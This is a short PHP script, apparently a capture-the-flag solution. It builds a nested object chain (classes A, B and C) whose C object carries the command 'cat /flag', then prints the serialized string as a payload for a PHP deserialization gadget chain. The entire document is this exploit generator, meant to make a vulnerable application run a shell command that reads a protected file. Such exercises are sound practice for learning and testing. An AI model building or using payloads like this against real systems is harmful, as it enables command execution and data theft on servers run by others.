<?php

class A
{
    public $str;
}

class B
{
    public $fun;
}

class C
{
    public $command;
}

$c = new C();
$c->command = "cat /flag";

$a = new A();
$a->str = $c;

$b = new B();
$b->fun = $a;

echo serialize($b);
